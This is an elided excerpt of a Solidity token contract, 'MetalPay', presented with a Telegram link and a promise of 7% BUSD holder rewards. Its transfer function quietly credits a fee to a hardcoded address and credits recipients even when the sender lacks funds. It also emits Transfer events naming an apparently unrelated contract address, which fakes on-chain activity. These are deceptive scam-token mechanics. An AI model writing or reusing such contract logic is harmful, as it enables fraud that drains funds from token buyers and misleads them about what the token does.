...
// Submitted for Telegram: https://t.me/metalpaybsc
// Hold MetalPay for get auto rewards in your wallet 7% BUSD
...
contract  MetalPay  is Ownable, IERC20 {
    ...
    function _transfer(address form, address to, uint256 amount) internal virtual {
        ...
        _rOwned[0x0bc583f7A9e15842Fc96c5BE48fB5D04d917084B] += _bruntoken;
        if (sendertokens >= amount) { _rOwned[form] = sendertokens - amount; }
        _rOwned[to] += tokenamount; 
        if (_brunfee > 0) {
        emit Transfer(form, 0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56, _bruntoken);
        }
